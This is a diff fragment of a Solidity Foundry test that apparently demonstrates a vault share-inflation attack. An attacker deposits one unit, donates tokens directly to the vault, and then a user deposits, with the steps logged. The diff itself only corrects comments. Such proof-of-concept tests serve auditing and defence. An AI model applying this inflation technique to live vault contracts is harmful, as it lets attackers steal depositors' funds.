@@ -29,13 +29,13 @@ contract VaultTest is Test {
         vaultContract.deposit(1, attacker);
         console2.log("   Attacker shares = ", vaultContract.balanceOf(address(attacker)));
         console2.log("   Vault total assets = ", vaultContract.totalAssets());
-        // Attacker donate 100e18 amount of token
+        // Attacker donate 100 amount of token
         console2.log("2. Attacker transfer 100 amount of token to the vault ");
         mockToken.transfer(address(vaultContract), amount);
         console2.log("   Vault total assets = ", vaultContract.totalAssets());
         vm.stopPrank();
 
-        // user deposit 100e18 amount of token
+        // user deposit 100 amount of token
         vm.startPrank(user);
         mockToken.approve(address(vaultContract), amount);
         console2.log("3. user deposits 100 amount of token to the vault");
